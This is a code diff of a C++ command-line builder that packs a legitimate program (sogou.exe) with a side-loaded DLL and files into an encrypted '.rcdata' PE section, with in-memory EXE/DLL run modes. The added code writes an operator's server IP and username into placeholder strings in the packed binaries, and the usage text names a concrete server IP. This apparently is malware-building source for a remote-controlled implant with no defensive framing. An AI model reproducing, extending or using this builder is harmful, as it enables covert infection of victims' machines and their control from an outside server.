@@ -42,15 +42,14 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 
 	if (argc < 3)
 	{
+		printf("%s param error\r\n", argv[0]);
 		printf("example:%s -b sogou.exe sbiedll.dll -f c:\\users -c params.dat -o out.exe\r\n",argv[0]);
 
 		printf("example:%s -b sogou.exe sbiedll.dll -f c:\\users -p jy20200729 47.116.51.29 -o out.exe\r\n", argv[0]);
 
 		printf("example:%s -re sogou.exe -c params.dat -o out.exe\r\n", argv[0]);
 
-		printf("example:%s -rd sogou.dll -c params.dat -o out.dll\r\n", argv[0]);
-
-		printf("%s param error\r\n",argv[0]);
+		printf("example:%s -rd sogou.dll -c params.dat -o out.dll\r\n", argv[0]);	
 		ret = getchar();
 		return -1;
 	}
@@ -63,10 +62,13 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 	char filelist[MAX_FILE_COUNT][MAX_PATH];
 	memset(filelist, 0, MAX_FILE_COUNT * MAX_PATH);
 	int type = 0;
-	int paramscnt = 0;
-	char szoutFn[MAX_PATH] = { 0 };
+	int filecnt = 0;
+	char outFn[MAX_PATH] = { 0 };
 	//string dstcryptfn = "test.dat";
 	//string dstcfgfn = "config.dat";
+
+	char* username = 0;
+	char* serverip = 0;
 
 	int bRename = FALSE;
 
@@ -91,8 +93,7 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 
 			for (int j = seq + 1; j < seq +3; j++)
 			{
-				lstrcpyA(filelist[paramscnt], argv[j]);
-				paramscnt++;
+				lstrcpyA(filelist[filecnt++], argv[j]);
 			}
 
 			seq += 2;
@@ -105,8 +106,8 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 			cpu_arch = GetPeArch(argv[seq + 1]);
 
 			type = MEM_RUN_EXE;
-			lstrcpyA(filelist[paramscnt], argv[seq + 1]);
-			paramscnt++;
+			lstrcpyA(filelist[filecnt++], argv[seq + 1]);
+
 			seq += 1;
 			continue;
 		}
@@ -114,14 +115,13 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 		{
 			type = MEM_RUN_DLL;
 			cpu_arch = GetPeArch(argv[seq + 1]);
-			lstrcpyA(filelist[paramscnt], argv[seq + 1]);
-			paramscnt++;
+			lstrcpyA(filelist[filecnt++], argv[seq + 1]);
 			seq += 1;
 			continue;
 		}
 		else if (lstrcmpiA(str, "-o") == 0)
 		{
-			lstrcpyA(szoutFn, argv[seq + 1]);
+			lstrcpyA(outFn, argv[seq + 1]);
 			seq += 1;
 			continue;
 		}
@@ -134,8 +134,7 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 		else if (lstrcmpiA(str, "-c") == 0)
 		{
 			Public::prepareCfg(argv[seq + 1], CONFIG_FILENAME);
-			lstrcpyA(filelist[paramscnt], CONFIG_FILENAME);
-			paramscnt++;
+			lstrcpyA(filelist[filecnt++], CONFIG_FILENAME);
 
 			seq += 1;
 			continue;
@@ -143,15 +142,19 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 		else if (lstrcmpiA(str, "-p") == 0)
 		{
 			if (seq + 2 > argc) {
-				log("argument error\r\n");
+				log("%s %d error\r\n", __FUNCTION__, __LINE__);
 				return -1;
 			}
+
+			serverip = argv[seq + 1];
+			username = argv[seq + 2];
+
 			Public::prepareParams(argv[seq + 1], argv[seq + 2],type, key,CONFIG_FILENAME);
 
 			seq += 2;
 
-			lstrcpyA(filelist[paramscnt], CONFIG_FILENAME);
-			paramscnt++;		
+			lstrcpyA(filelist[filecnt++], CONFIG_FILENAME);
+	
 			continue;
 		}
 		else if (lstrcmpiA(str, "-rename") == 0)
@@ -161,13 +164,13 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 		}	
 	}
 
-	if (szoutFn[0] == 0)
+	if (outFn[0] == 0)
 	{
-		lstrcpyA(szoutFn, DEFAULT_TARGET_FILENAME);
+		lstrcpyA(outFn, DEFAULT_TARGET_FILENAME);
 	}
 	if (type == 0)
 	{
-		log("command error!\r\n");
+		log("%s %d error\r\n", __FUNCTION__, __LINE__);
 		ret = getchar();
 		return -1;
 	}
@@ -181,13 +184,27 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 		return -1;
 	}
 
-	char secname[] = { '.','r','c','d','a','t','a',0 };
+	for (int i = 0; i < filecnt; i++) {
+		const char* fn = filelist[i];
+		int fnlen = strlen(fn);
+		if (lstrcmpA(fn + fnlen - 4, ".exe") == 0 || lstrcmpA(fn + fnlen - 4, ".dll") == 0) {
+			char* iptag = "this is ip address";
+			ret = FileHelper::FileSearchSet(fn, iptag, strlen(iptag), serverip, strlen(serverip)+1);
+			if (ret)
+				log("%s %d write ip:%s in file:%s\r\n",__FUNCTION__,__LINE__, serverip,fn);
+			char* usertag = "this is user name";
+			ret = FileHelper::FileSearchSet(fn, usertag, strlen(usertag), username, strlen(username)+1);
+			if (ret)
+				log("%s %d write username:%s in file:%s\r\n", __FUNCTION__, __LINE__, username, fn);
+		}
+	}
 
-	string resultfn = Section::insertSection(type, cpu_arch, secname, filelist, paramscnt,outpath, szoutFn,key);
+	char secname[] = { '.','r','c','d','a','t','a',0 };
+	string resultfn = Section::insertSection(type, cpu_arch, secname, filelist, filecnt,outpath, outFn,key);
 	if (resultfn == "")
 	{
 		log("%s %d error\r\n",__FUNCTION__,__LINE__);
-		ret = getchar();
+		//ret = getchar();
 		return -1;
 	}
 
@@ -219,7 +236,7 @@ int GetPeArch(char * fn) {
 	ret = FileHelper::fileReader(fn, &data, &fs);
 	if (ret <= 0)
 	{
-		printf("fileReader file:%s error\r\n", fn);
+		log("%s %d error\r\n", __FUNCTION__, __LINE__);
 		return -1;
 	}
 	int cpu_arch = PEParser::getPEArch((const char*)data);
@@ -252,8 +269,6 @@ int GetPeArch(char * fn) {
 
 
 void test() {
-
-
 	Resource::getResource((DWORD)GetModuleHandle(0), "");
 	return;
 }
